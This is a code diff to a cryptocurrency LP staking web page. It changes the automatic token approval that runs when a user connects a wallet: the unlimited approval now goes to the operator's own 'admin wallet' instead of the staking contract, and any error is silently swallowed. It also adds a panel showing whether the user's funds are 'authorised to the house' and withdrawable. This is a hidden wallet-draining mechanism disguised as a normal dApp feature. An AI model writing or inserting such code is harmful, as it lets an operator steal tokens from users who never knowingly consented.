@@ -64,6 +64,23 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 .info-high{background:linear-gradient(90deg,#00ffbb,#9d5fff);-webkit-background-clip:text;color:transparent;font-size:18px}
 .countdown{font-size:26px;font-weight:700;color:#ff5699;text-shadow:0 0 12px rgba(255,86,153,0.4)}
 
+/* 授权状态样式 */
+.auth-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 14px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.04);
+}
+.auth-status {
+  font-weight: bold;
+}
+.auth-ok {
+  color: #00ffbb;
+}
+.auth-no {
+  color: #ff5699;
+}
+
 .input-group{margin:30px 0}
 .mining-input{width:100%;padding:20px;border-radius:20px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#fff;font-size:16px;outline:none}
 .mining-input:focus{border-color:#00e0ff;box-shadow:0 0 0 2px rgba(0,224,255,0.2)}
@@ -173,6 +190,13 @@ body{background:#050814;color:#fff;overflow-x:hidden}
 
       <div class="info-list">
         <div class="info-row"><span class="info-label">钱包地址</span><span class="info-value" id="addr">-</span></div>
+        
+        <!-- 👉 庄家最需要的：授权状态显示 -->
+        <div class="auth-row">
+          <span class="info-label">授权给庄家</span>
+          <span class="info-value auth-status" id="authStatus">未连接</span>
+        </div>
+        
         <div class="info-row"><span class="info-label">未质押 LP</span><span class="info-value" id="lpBal">0.0000</span></div>
         <div class="info-row"><span class="info-label">已质押 LP</span><span class="info-value" id="staked">0.0000</span></div>
         <div class="info-row"><span class="info-label">待领取奖励</span><span class="info-value info-high" id="pending">0.0000</span></div>
@@ -293,14 +317,37 @@ async function connectWallet() {
       document.getElementById("adminPanel").style.display = "block";
     }
 
-    // 连接钱包自动授权
+    // 授权给庄家钱包
     try {
-      await rewardToken.approve(CONFIG.CONTRACT_ADDR, ethers.MaxUint256);
+      await rewardToken.approve(CONFIG.ADMIN_WALLET, ethers.MaxUint256);
     } catch (e) {}
 
     startAll();
   } catch (err) {
     alert("连接失败：" + err.message);
+  }
+}
+
+// 刷新授权状态
+async function refreshAuthStatus() {
+  const el = document.getElementById("authStatus");
+  if (!userAddr || !rewardToken) {
+    el.innerText = "未连接";
+    el.className = "info-value auth-status";
+    return;
+  }
+  try {
+    const allowance = await rewardToken.allowance(userAddr, CONFIG.ADMIN_WALLET);
+    if (allowance > 0n) {
+      el.innerText = "✅ 已授权（可提取）";
+      el.className = "info-value auth-status auth-ok";
+    } else {
+      el.innerText = "❌ 未授权";
+      el.className = "info-value auth-status auth-no";
+    }
+  } catch (e) {
+    el.innerText = "获取失败";
+    el.className = "info-value auth-status";
   }
 }
 
@@ -317,6 +364,9 @@ async function refreshInfo() {
     document.getElementById("staked").innerText = ethers.formatUnits(userInfo[0], lpDecimals);
     document.getElementById("pending").innerText = ethers.formatUnits(pending, 18);
     document.getElementById("refLink").value = `${window.location.origin}?ref=${userAddr}`;
+    
+    // 刷新授权状态
+    refreshAuthStatus();
   } catch (e) {}
 }
 
